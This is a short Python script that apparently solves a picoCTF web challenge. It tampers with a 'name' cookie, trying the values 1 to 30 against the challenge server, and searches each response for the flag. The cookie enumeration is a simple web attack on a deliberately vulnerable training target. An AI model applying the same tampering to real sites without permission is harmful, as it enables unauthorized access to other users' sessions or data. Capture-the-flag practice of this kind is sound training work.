import requests
import re

url = 'http://mercury.picoctf.net:17781/'
for i in range(1, 31):
    with requests.Session() as s:
        # Set the cookie value
        s.cookies.set('name', str(i))
        
        # Send the request
        r = s.get(url)
        
        # Check if the HTML contains 'picoCTF{' and extract the flag
        flag_match = re.search(r'picoCTF\{[a-z0-9_]*\}', r.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"Cookie value {i}: Flag found - {flag}")
            break
